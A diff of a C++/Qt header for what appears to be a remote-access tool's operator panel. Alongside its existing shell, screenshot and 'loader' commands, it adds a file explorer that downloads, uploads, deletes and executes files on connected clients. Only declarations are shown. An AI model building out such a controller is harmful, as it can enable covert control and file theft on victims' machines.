@@ -19,7 +19,7 @@
 Q_GUI_EXPORT QPixmap qt_pixmapFromWinHBITMAP(HBITMAP bitmap, int hbitmapFormat=0);
 
 QT_BEGIN_NAMESPACE
-namespace Ui { class MWindow; class Explorer; class ScreenShot; class WScreenShot; }
+namespace Ui { class MWindow; class ScreenShot; class WScreenShot; class WExplorer; }
 QT_END_NAMESPACE
 
 #define CMD_HADSHAKE	0x0
@@ -29,6 +29,44 @@ QT_END_NAMESPACE
 #define CMD_SCREEN		0x4
 #define CMD_LOADER		0x5
 #define CMD_SHELL		0x6
+#define CMD_EXPLOR		0x7
+
+#define DO_GETCURPATH	0x0
+#define DO_SETCURPATH   0x1
+#define DO_DOWLDFILE	0x2
+#define DO_UPLDFILE		0x3
+#define DO_REMFILE		0x4
+#define DO_EXEC			0x5
+
+class WExplorer : public QWidget
+{
+    Q_OBJECT
+private:
+    SOCKET SendingSocket;
+public:
+    explicit WExplorer(QWidget *parent = nullptr);
+    ~WExplorer();
+signals:
+    void GetCurrPath(int NOMER);
+public slots:
+    void GetFiles(int NOMER);
+    //void Release(QString Json, int NOMER);
+    void SetCurrPath(int IDX, int NOMER);
+    void DownloadFile(int IDX, int NOMER);
+    void UploadFile(int IDX, int NOMER);
+    void RemoveFile(int IDX, int NOMER);
+    void ExecuteFile(int IDX, int NOMER);
+    void sOpenCliMenu(QPoint pos);
+    void sOpenSrvMenu(QPoint pos);
+private:
+    QMenu *menuClient;
+    QMenu *menuServer;
+    QAction *DowloadFile;
+    QAction *ExecFile;
+    QAction *DelFile;
+    QAction *UplFile;
+    Ui::WExplorer *ui;
+};
 
 class WScreenShot : public QWidget
 {
@@ -50,6 +88,12 @@ class WSocket  : public QObject
     Q_OBJECT
 private:
 
+    typedef struct EXPLRR
+    {
+        DWORD IND;
+        DWORD DO;
+        DWORD SIZEofJSON;
+    } EXPLRR;
 
     typedef struct CLIENTS
     {
@@ -137,11 +181,18 @@ public slots:
     void CheckOnline();
     void Recving(int NOMER);
     void GetScreen(int NOMER);
-
+    void Release(QString Json, int NOMER);
+    void GetCurrPath(int NOMER);
+    void SetCurrPath(int IDX, int NOMER);
+    void DownloadFile(int IDX, int NOMER);
+    void UploadFile(int IDX, int NOMER);
+    void RemoveFile(int IDX, int NOMER);
+    void ExecuteFile(int IDX, int NOMER);
 signals:
     void AddNewClient(int NOMER, char *IP, char *HWID, char *USERNAME, char *OSVER);
     void DelClient(int NOMER);
     void CloseShell();
+    void Release(QString Json);
     void GetBitmap(BYTE *bytes, unsigned int Size, int w, int h);
 };
 
@@ -153,6 +204,7 @@ public:
     MWindow(QWidget *parent = nullptr);
     ~MWindow();
     WScreenShot *screenShot;
+    WExplorer *fileExplorer;
     WSocket *wsocket80, *sendHandl, *shellSocket;
     QThread *mainSocketThread, *shellSocketThread, *sendSocketThread;
 
@@ -174,6 +226,7 @@ private slots:
 
 signals:
     void ReversCmd(int NOMER);
+    void GetFiles(int NOMER);
     void WaitClient();
     void WaitShell();
     void CheckOnline();
